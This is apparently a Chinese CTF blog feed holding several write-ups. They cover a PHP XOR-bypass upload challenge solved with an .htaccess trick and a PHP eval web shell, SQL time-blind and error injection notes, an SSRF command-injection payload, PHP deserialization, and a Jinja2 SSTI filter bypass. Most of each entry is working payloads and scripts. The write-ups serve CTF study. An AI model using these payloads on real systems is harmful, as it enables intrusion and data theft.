要异或浏览器不能解码的不可见的字符    [大佬的脚本](https://blog.csdn.net/weixin_43940853/article/details/103749357?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control&amp;dist_request_id=1330144.34969.16182323962248803&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-4.control)        ```pythonimport stringee= string.printableprint(ee)   ##输出可打印字符a= map(lambda x:x.encode("hex"),list(ee))_=[]G=[]E=[]T=[]print(list(ee))for i in range(256):    for j in range(256):        if (chr(i) not in list(ee)) &amp; (chr(j) not in list(ee)):            tem = i^j            if chr(tem)=="_":                temp=[]                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])         ##转为十六进制是为了缩短长度                _.append(temp)            if chr(tem)=="G":                temp=[]                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])                G.append(temp)            if chr(tem)=="E":                temp=[]                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])                E.append(temp)            if chr(tem)=="T":                temp=[]                temp.append(hex(i)[2:] + "^" + str(hex(j))[2:])                T.append(temp)print(_)print(G)print(E)print(T)</code></pre></code></pre><p>构造<code>$_GET[a]();&amp;a=phpinfo</code><br><img src="https://sc02.alicdn.com/kf/U71602567344d4ae2afee14ccff8f185ek.jpg" alt="01.png"><br>payload:<code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=phpinfo</code>    </p><p>然后执行<code>get_the_flag()</code>函数<br><code>$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=get_the_flag</code>       </p><p>上传文件<br>过滤了<code>ph/i</code><br>考虑<code>.user.ini</code>或者<code>.htaccess</code><br><code>.user.ini</code>需要上传的目录里有可执行的PHP文件，这里显然没有         </p><p><code>.htaccess</code><br>因为有头文件检测，一般用GIF89a，看WP说是会使文件失效；我试了下，发现上传失败；用<code>#define width 1337#define height 1337 </code>可以绕过   </p><pre><code>    #define width 1337    #define height 1337    AddType application/x-httpd-php .ahhh    ##将.ahhh后缀的文件以PHP解析    php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh </code></pre><p>最后一句的解释：<br><img src="https://ae02.alicdn.com/kf/Ued9c20fc4b034016b3961677278461e7l.jpg" alt="05.png">    </p><p>过滤了<code>&lt;?</code><br><code>&lt;script language=&quot;php&quot;&gt;system(&#39;cat /flag&#39;);&lt;/script&gt;</code>也不能用，php版本7.x的         </p><p>base64编码，在<code>.htaccess</code>里解码         </p><p><a href="https://blog.csdn.net/qq_42967398/article/details/105615235">大佬的上传脚本</a>         </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64htaccess <span class="token operator">=</span> <span class="token triple-quoted-string string">b"""#define width 1337#define height 1337AddType application/x-httpd-php .ahhhphp_value auto_append_file "php://filter/convert.base64-decode/resource=./shell.ahhh""""</span>shell <span class="token operator">=</span> <span class="token string">b"GIF89a12"</span> <span class="token operator">+</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">b"&lt;?php eval($_REQUEST['cmd']);?>"</span><span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://2f470aa2-5472-401e-b146-efd0864251a5.node3.buuoj.cn/?_=$&#123;%df%c7%c5%d4^%80%80%80%80&#125;&#123;%80&#125;();&amp;%80=get_the_flag"</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'.htaccess'</span><span class="token punctuation">,</span>htaccess<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"upload"</span><span class="token punctuation">:</span><span class="token string">"Submit"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">'shell.ahhh'</span><span class="token punctuation">,</span>shell<span class="token punctuation">,</span><span class="token string">'image/jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre></code></pre><p><img src="https://ae04.alicdn.com/kf/U8ab36d268f2c4e338ff91bd9e73355d6W.jpg" alt="02.png">         </p><p>访问一句话文件，<img src="https://ae02.alicdn.com/kf/U1b0011f9ec664565ad977d32c46423b74.jpg" alt="03.png"><br>可用<br>但没法直接读文件<br>需要绕过<code>open_basedir</code>          </p><p><a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#%E5%89%8D%E8%A8%80">从PHP底层看open_basedir bypass</a>         </p><p>payload:<code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code><img src="https://ae03.alicdn.com/kf/U043edb17de044c79b82910e8d280915b7.jpg" alt="04.png">         </p><p>payload:<code>cmd=chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(file_get_contents(&quot;/THis_Is_tHe_F14g&quot;));</code></p><p>得到flag       </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL</title>
    <link href="/2021/04/11/SQL/"/>
    <url>/2021/04/11/SQL/</url>
    
    <content type="html"><![CDATA[<h2 id="time-injection"><a href="#time-injection" class="headerlink" title="time injection"></a>time injection</h2><h3 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h3><p><code>BENCHMARK(loop_count,expr)</code><br>loop_count是重复执行的次数，expr是要执行的表达式       </p><pre><code>mysql&gt; select benchmark(100000000,1+1);+--------------------------+| benchmark(100000000,1+1) |+--------------------------+|                        0 |+--------------------------+1 row in set (1.48 sec)        </code></pre><p>以此结合and进行时间盲注        </p><pre><code>1=1延时mysql&gt; select * from guestbook where comment_id=1 and 1=1 and benchmark(10000000,sha(1));Empty set (2.04 sec)1=0，不会延时mysql&gt; select * from guestbook where comment_id=1 and 1=0 and benchmark(10000000,sha(1));Empty set (0.00 sec)</code></pre><p>以<code>sqllab-less-9</code>为例<br><img src="https://ae04.alicdn.com/kf/U4e8dd5045c0d4f279cefe3efd1232931i.jpg" alt="01.png"><br>payload：<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(benchmark(10000000,sha(1)))%23</code>      </p><p>###笛卡尔积<br>笛卡尔积：   </p><p><img src="https://ae02.alicdn.com/kf/U3af545a58a114e0d89199d96773005e5y.jpg"></p><pre><code>mysql&gt; select count(*) from information_schema.tables;+----------+| count(*) |+----------+|      287 |+----------+1 row in set (0.00 sec)       </code></pre><p>后面还可以加其他列或者表，从而使其计算花费的时间不同<img src="https://ae03.alicdn.com/kf/Ua5f6439e6b1b43ec9fa741c0cd281150k.jpg" alt="02.png">       </p><pre><code>1=1 延时mysql&gt; select * from guestbook where comment_id=1 and 1=1 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);+------------+-------------------------+------+| comment_id | comment                 | name |+------------+-------------------------+------+|          1 | This is a test comment. | test |+------------+-------------------------+------+1 row in set (11.73 sec)1=0  不会延时mysql&gt; select * from guestbook where comment_id=1 and 1=0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B);Empty set (0.00 sec)</code></pre><p>依旧可以以and连接构造时间盲注        </p><p>payload：<code>1&#39; and ascii(substr(database(),1,1))&gt;0 and(select count(*) from information_schema.columns,information_schema.tables A,information_schema.tables B)#</code>     </p><h3 id="rpad计算延时注入"><a href="#rpad计算延时注入" class="headerlink" title="rpad计算延时注入"></a>rpad计算延时注入</h3><p><code>RPAD(str,len,padstr)</code><br>返回len长度的str，不够的话用padstr补，若str长度大于len,返回len长度的str<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/168746/13/20334/153366/6081a718E1897bbec/8ee657df0325bc7f.png" alt="03.png">       </p><p><code>expr REGEXP pat</code><br>在expr中匹配pat<br>regexp和rlike同义           </p><p><img src="https://img10.360buyimg.com/ddimg/jfs/t1/178891/22/548/169658/6081a71aE5caf9f70/c753df4964ed571e.png" alt="04.png">     </p><pre><code>payload： select * from users where id=`1 and if(1=0,concat(rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;),rpad(1,999999,&#39;a&#39;)) RLIKE &#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#39;,1);`       </code></pre><p><img src="https://img14.360buyimg.com/ddimg/jfs/t1/168677/32/20502/382379/6081a8c3E3c16a0e2/92b76f71f50d585f.png" alt="05.png">       </p><p>用Level试了一下，似乎没有成功？？？？<img src="https://img12.360buyimg.com/ddimg/jfs/t1/168088/38/20288/29526/60826e5cE14244722/a813234e542af029.png" alt="06.png">      </p><h3 id="整数溢出报错"><a href="#整数溢出报错" class="headerlink" title="整数溢出报错"></a>整数溢出报错</h3><p>pow      </p><p><img src="https://img13.360buyimg.com/ddimg/jfs/t1/164691/39/20277/134557/608272e2E8727852f/f762dd563901c2b4.png" alt="07.png">          </p><p>据此可以进行布尔盲注     </p><p>cot(x)—–&gt;返回x的余切      </p><pre><code>mysql&gt; select cot(0);ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;       </code></pre><p><code>exp(x)</code>—-&gt;返回e的x次幂      </p><pre><code>mysql&gt; select exp(999);ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(999)&#39;      </code></pre><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161575/36/20404/34820/608273efEd1d27c04/8b75729a41fd958f.png" alt="08.png">       </p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>insert报错和时间<br><img src="https://img11.360buyimg.com/ddimg/jfs/t1/161571/22/20489/162255/60827dcdE2d218ad0/9f97136a365a1ece.png" alt="09.png">       </p><p>update报错和时间<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/175936/24/6042/226619/60827f68E3da3cadf/b1618cab9168f4d8.png" alt="10.png">     </p><p>delete报错和时间<br><img src="https://img13.360buyimg.com/ddimg/jfs/t1/162426/35/20725/86138/60827f68E8d2fa007/af3811c27c90d2bc.png" alt="11.png">       </p><hr><p><a href="https://xz.aliyun.com/t/5505">MORE</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRFme</title>
    <link href="/2021/04/09/BUU67/"/>
    <url>/2021/04/09/BUU67/</url>
    
    <content type="html"><![CDATA[<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$http_x_headers</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##以逗号分割$_SERVER['HTTP_X_FORWARDED_FOR']，返回数组</span>        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$http_x_headers</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"sandbox/"</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"orange"</span> <span class="token punctuation">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token shell-comment comment">##$_SERVER["REMOTE_ADDR"]返回IP地址</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##创建沙盒 </span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token shell-comment comment">##改变目录到沙盒</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"GET "</span> <span class="token punctuation">.</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"url"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"filename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$dir</span>  <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"dirname"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token shell-comment comment">##url参数以GET命令执行，结果存入以filename参数的值命名的文件里</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"basename"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre></code></pre><p>读取根目录，创建文件abc<br><code>url=/&amp;filename=abc</code><br>访问该文件<code>/sandbox/fcf2bccafc269c160382150a0166d632/abc    </code><br> <img src="https://ae03.alicdn.com/kf/U9d258cc946ec4e4fb723d7652f2049c7P.jpg" alt="01.png"></p><p>/readflag得到flag       </p><p><code>bash -c /readflag|</code><br>不过要先有一个同名文件<br>然后执行该命令<br>payload：<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code>执行两遍，然后访问<code>bash -c /readflag|</code>即可得到flag       </p><p><a href="https://www.freesion.com/article/5626598350/">perl脚本中GET命令执行漏洞</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dasctf</title>
    <link href="/2021/04/09/dasctf/"/>
    <url>/2021/04/09/dasctf/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>利用原生类，扫描，读取文件        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"B"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"ctfer"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token keyword">new</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">check</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token keyword">new</span>  <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">para</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'bad hacker~'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"hello "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">vaild</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            <span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span></code></pre></code></pre><p>初看平平无奇，也没啥危险函数，利用原生类了       </p><pre><code>    public function __wakeup()    &#123;        $this-&gt;check = new C;        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;            echo new  $this-&gt;class ($this-&gt;para);        &#125;        else            die(&#39;bad hacker~&#39;);    &#125;        </code></pre><p><img src="https://sc02.alicdn.com/kf/U9a1978f1ecdb43efb14e616b95cca88eP.jpg" alt="01.png">        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token operator">=</span><span class="token single-quoted-string string">'FilesystemIterator'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token operator">=</span><span class="token single-quoted-string string">'/var/www/html/'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>得到一个文件夹，然后再遍历这个文件夹，得到一个<code>flag.php</code><br>(这里用Diretorylterator的话，我在本地返回的是一个点）<br>读取文件       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$class</span><span class="token operator">=</span><span class="token single-quoted-string string">'SplFileObject'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$para</span><span class="token operator">=</span><span class="token double-quoted-string string">"/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$check</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token variable">$o</span>  <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><p>过滤的东西        </p><pre><code>blacklist&lt;/br&gt;   &#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   &#39;count&#39;,&#39;length&#39;,&#39;０&#39;,&#39;１&#39;,&#39;２&#39;,&#39;３&#39;,&#39;４&#39;,&#39;５&#39;,&#39;６&#39;,&#39;７&#39;,&#39;８&#39;,&#39;９&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;    &lt;/br&gt;</code></pre><p>join拼接      </p><p><code>&#123;&#123;[1,2,3]|join()&#125;&#125;</code>—–&gt; <code>123</code><br><code>&#123;&#123;[1,2,3]|join('|')&#125;&#125;</code>—–&gt;<code>1|2|3</code></p><pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop&#123;%set b=lipsum|string|list|attr(a)(𝟙𝟠)%&#125; # _&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os&#123;%set f=lipsum|string|list|attr(a)(𝟡)%&#125; # 空格&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%&#125; # 斜杠&#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%&#125; #点&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;#最后拼接起来#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;       </code></pre><p><a href="http://www.plasf.cn/articles/dasctf202103.html">MORE1</a><br><a href="https://blog.csdn.net/rfrder/article/details/115272645">MORE2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Comment</title>
    <link href="/2021/04/06/BUU66/"/>
    <url>/2021/04/06/BUU66/</url>
    
